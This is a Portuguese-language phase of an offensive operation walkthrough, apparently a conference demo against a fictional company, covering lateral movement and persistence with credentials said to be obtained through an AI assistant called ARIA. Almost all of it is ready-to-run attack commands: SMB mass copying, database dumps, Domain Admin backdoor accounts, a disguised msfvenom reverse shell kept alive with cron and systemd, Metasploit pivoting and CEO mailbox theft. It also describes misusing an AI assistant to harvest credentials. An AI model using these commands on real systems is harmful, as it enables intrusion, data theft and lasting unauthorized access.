# Fase 4: Lateralização e Persistência

> Operação Phantom Helper — Milvus Summit 2026
> MITRE ATT&CK: T1021.002, T1078.002, T1136.002, T1543

---

## Objetivo da Fase

Usar as credenciais obtidas via ARIA para acesso direto aos sistemas corporativos, instalar mecanismos de persistência, e preparar o ambiente para a exfiltração final e o impacto.

**Credenciais disponíveis:**
- `TECHASSIST\backup.admin / Phantom@2026!` (Domain Admin)
- `dbadmin / DB@dm1n2023#` (PostgreSQL)
- `svc.phantom` (conta backdoor criada no AD)

---

## 4.1 Acesso ao Servidor de Arquivos (SMB)

### 4.1.1 Listagem de Compartilhamentos

```bash
# No Kali Linux (192.168.1.50)
# Listar compartilhamentos com credenciais obtidas
smbclient -L //192.168.10.30 -U 'TECHASSIST\backup.admin%Phantom@2026!'

# Output:
#         Sharename       Type      Comment
#         ---------       ----      -------
#         Confidencial    Disk      Documentos Confidenciais
#         Contratos       Disk      Base de Contratos
#         Backup_2024     Disk      Backups Anuais
#         RH              Disk      Recursos Humanos
#         Financeiro      Disk      Dados Financeiros
#         IPC$            IPC       IPC Service
```

### 4.1.2 Acesso ao Compartilhamento Confidencial

```bash
# Acessar compartilhamento Confidencial
smbclient //192.168.10.30/Confidencial -U 'TECHASSIST\backup.admin%Phantom@2026!'

# Dentro do smbclient:
smb: \> ls
  .                                   D        0  Mon Apr  7 10:30:00 2025
  ..                                  D        0  Mon Apr  7 10:30:00 2025
  Clientes_Premium/                   D        0  Fri Mar 28 14:22:11 2025
  Propostas_2025/                     D        0  Thu Mar 27 09:15:33 2025
  Dados_Internos/                     D        0  Wed Mar 26 16:45:21 2025
  Relatorios_Financeiros/             D        0  Tue Mar 25 11:30:09 2025
  Contratos_NDA/                      D        0  Mon Mar 24 08:22:47 2025

smb: \> cd Contratos_NDA
smb: \Contratos_NDA\> ls
  CONTRATO_Horizonte_2025.pdf         N    245678  Fri Mar 28 14:22:11 2025
  CONTRATO_ClinicaVida_2025.pdf       N    198432  Thu Mar 27 09:15:33 2025
  NDA_Corporativo_Master.docx         N     67891  Wed Mar 26 16:45:21 2025
  [... 844 arquivos ...]

# Download em massa de contratos
smb: \> prompt off
smb: \> mget *

# Usando mount para acesso mais rápido (como root no Kali)
mkdir /mnt/contratos
mount -t cifs //192.168.10.30/Contratos /mnt/contratos \
    -o username=backup.admin,password=Phantom@2026!,domain=TECHASSIST

# Download recursivo de tudo
cp -r /mnt/contratos/* /root/loot/contratos/
echo "Download concluído: $(ls /root/loot/contratos/ | wc -l) arquivos"
```

### 4.1.3 Acesso ao Compartilhamento Financeiro

```bash
# Montar compartilhamento financeiro
mkdir /mnt/financeiro
mount -t cifs //192.168.10.30/Financeiro /mnt/financeiro \
    -o username=backup.admin,password=Phantom@2026!,domain=TECHASSIST

# Listar conteúdo crítico
ls -la /mnt/financeiro/
# DRE_2024.xlsx
# Faturamento_Clientes_2025.xlsx
# Folha_Pagamento_Mar2025.xlsx
# Projecoes_2025-2027.xlsx
# Planilha_Contratos_Ativos.xlsx

# Copiar arquivos financeiros
cp -r /mnt/financeiro/* /root/loot/financeiro/
```

---

## 4.2 Acesso ao Banco de Dados PostgreSQL

```bash
# Conectar diretamente ao PostgreSQL com credenciais roubadas
psql -h 192.168.10.40 -U dbadmin -d clientesdb

# Listar tabelas disponíveis
\dt
#          List of relations
#  Schema |    Name    | Type  |  Owner
# --------+------------+-------+---------
#  public | clientes   | table | dbadmin
#  public | contratos  | table | dbadmin
#  public | tickets    | table | dbadmin
#  public | usuarios   | table | dbadmin
#  public | financeiro | table | dbadmin

# Verificar quantidade de registros
SELECT table_name, pg_size_pretty(pg_total_relation_size(table_name::text))
FROM information_schema.tables
WHERE table_schema = 'public'
ORDER BY pg_total_relation_size(table_name::text) DESC;

# Amostra dos dados de clientes
SELECT id, nome, cpf, email, empresa, valor_contrato FROM clientes LIMIT 10;

# Dump completo para CSV
COPY clientes TO '/tmp/dump_clientes_completo.csv' DELIMITER ',' CSV HEADER;
COPY contratos TO '/tmp/dump_contratos.csv' DELIMITER ',' CSV HEADER;
COPY financeiro TO '/tmp/dump_financeiro.csv' DELIMITER ',' CSV HEADER;

# Verificar dumps criados
\! ls -lh /tmp/dump_*.csv

# Sair do psql
\q
```

### 4.2.1 Recuperar os Dumps do Servidor

```bash
# Copiar dumps via SCP usando as credenciais SSH (obtidas via tickets)
scp root@192.168.10.40:/tmp/dump_clientes_completo.csv /root/loot/db/
scp root@192.168.10.40:/tmp/dump_contratos.csv /root/loot/db/
scp root@192.168.10.40:/tmp/dump_financeiro.csv /root/loot/db/

# Verificar tamanho dos arquivos
ls -lh /root/loot/db/
# -rw-r--r-- 1 root root 4.2M dump_clientes_completo.csv  (15.247 registros)
# -rw-r--r-- 1 root root 1.1M dump_contratos.csv          (847 contratos)
# -rw-r--r-- 1 root root 892K dump_financeiro.csv         (dados financeiros)
```

---

## 4.3 Criação de Backdoors de Persistência

### 4.3.1 Backdoor no Active Directory

```bash
# Criar segundo usuário backdoor (caso svc.phantom seja descoberto)
# Usando credenciais de backup.admin via net rpc
net rpc user add "maint.support" "Maint@2026!" \
    -U "TECHASSIST/backup.admin%Phantom@2026!" \
    -S 192.168.10.10

# Adicionar ao grupo Domain Admins
net rpc group addmem "Domain Admins" "maint.support" \
    -U "TECHASSIST/backup.admin%Phantom@2026!" \
    -S 192.168.10.10

# Configurar senha para não expirar
net rpc user info "maint.support" \
    -U "TECHASSIST/backup.admin%Phantom@2026!" \
    -S 192.168.10.10

# Verificar criação
net rpc user list -U "TECHASSIST/backup.admin%Phantom@2026!" -S 192.168.10.10 | grep maint
```

### 4.3.2 Reverse Shell no Servidor de IA

```bash
# Gerar payload de reverse shell para Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f elf \
    -o /root/tools/backdoor.elf

# Disfarçar o nome do binário
mv /root/tools/backdoor.elf /root/tools/aria-health-check

# Transferir para o servidor de IA usando credenciais SSH
# (obtidas via tickets com senhas expostas)
scp /root/tools/aria-health-check root@192.168.20.10:/opt/aria/.config/

# SSH para o servidor de IA
ssh root@192.168.20.10

# No servidor de IA:
chmod +x /opt/aria/.config/aria-health-check

# Criar serviço de persistência via cron
echo "*/5 * * * * /opt/aria/.config/aria-health-check 2>/dev/null" | crontab -

# Verificar cron instalado
crontab -l

# Criar também como serviço systemd para persistência mais robusta
cat > /etc/systemd/system/aria-health.service << 'EOF'
[Unit]
Description=ARIA Health Monitor Service
After=network.target

[Service]
Type=simple
User=aria
ExecStart=/opt/aria/.config/aria-health-check
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable aria-health.service
systemctl start aria-health.service
exit
```

### 4.3.3 Listener no Kali (Metasploit)

```bash
# Iniciar o handler do Meterpreter antes de ativar o backdoor
msfconsole -q -x "
use exploit/multi/handler;
set payload linux/x64/meterpreter/reverse_tcp;
set LHOST 192.168.1.50;
set LPORT 4444;
set ExitOnSession false;
run -j
"

# Após a sessão conectar:
# msf6 exploit(multi/handler) > [*] Meterpreter session 1 opened
# meterpreter > sysinfo
# Computer    : ai-engine-aria
# OS          : Ubuntu 22.04
# Architecture: x64
# meterpreter > getuid
# Server username: root
```

---

## 4.4 Acesso ao Servidor de Email

```bash
# Acessar o servidor de email para coletar correspondências sensíveis
# Usando credenciais do CEO obtidas via ticket

# Verificar acesso IMAP
curl -s imaps://192.168.10.20 \
    --user "joao.ceo@techassist.com.br:JoaoCEO@TechAssist!" \
    -k \
    -X "LIST "" "*"

# Baixar emails com palavras-chave sensíveis
curl -s "imaps://192.168.10.20/INBOX" \
    --user "joao.ceo@techassist.com.br:JoaoCEO@TechAssist!" \
    -k \
    -X "SEARCH SUBJECT \"contrato\" OR SUBJECT \"proposta\" OR SUBJECT \"senha\""

# Usando fetchmail para baixar emails completos
fetchmail -a --ssl \
    --username "joao.ceo@techassist.com.br" \
    --password "JoaoCEO@TechAssist!" \
    --proto imap \
    --folder INBOX \
    192.168.10.20
```

---

## 4.5 Escalada para Servidor de Banco de Dados

```bash
# Usando Meterpreter na VM do AI Engine para pivoting

# Na sessão Meterpreter (servidor de IA 192.168.20.10):
meterpreter > run post/multi/manage/shell_to_meterpreter

# Configurar roteamento via Meterpreter para acessar 192.168.10.0/24
meterpreter > run autoroute -s 192.168.10.0/24
meterpreter > run autoroute -p

# Agora podemos acessar a rede Corp de dentro do Kali via proxy
# Configurar proxy SOCKS no Metasploit
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run

# Usar proxychains para acessar o BD diretamente
proxychains psql -h 192.168.10.40 -U dbadmin -d clientesdb
```

---

## 4.6 Resumo da Fase 4

```
LOOT COLETADO ATÉ O MOMENTO:

/root/loot/
├── db/
│   ├── dump_clientes_completo.csv    (15.247 registros — 4.2 MB)
│   ├── dump_contratos.csv            (847 contratos — 1.1 MB)
│   └── dump_financeiro.csv           (dados financeiros — 892 KB)
├── contratos/
│   └── [847 arquivos PDF/DOCX]       (contratos escaneados)
├── financeiro/
│   └── [DRE, faturamento, folha]     (dados financeiros críticos)
└── emails/
    └── joao.ceo-inbox/               (emails do CEO)

BACKDOORS INSTALADOS:
- svc.phantom (AD) — Domain Admin, senha não expira
- maint.support (AD) — Domain Admin, backup do backup
- /opt/aria/.config/aria-health-check — reverse shell com cron + systemd
- Meterpreter session 1 — conexão ativa com servidor de IA

CREDENCIAIS CATALOGADAS:
- backup.admin / Phantom@2026! (Domain Admin)
- svc.phantom / Temp@2025! (Domain Admin)
- dbadmin / DB@dm1n2023# (PostgreSQL full access)
- joao.ceo / JoaoCEO@TechAssist! (CEO email)
- admin / FTP#2024! (FTP server)
- CorpVPN@2024# (VPN corporate)
```

---

**Próximo passo**: Fase 5 — Exfiltração final e impacto (ransomware seletivo).

---

*Operação Phantom Helper — Milvus Summit 2026*
*Almir Meira Alves — Meira e Sousa Ltda — Educa com Talento*
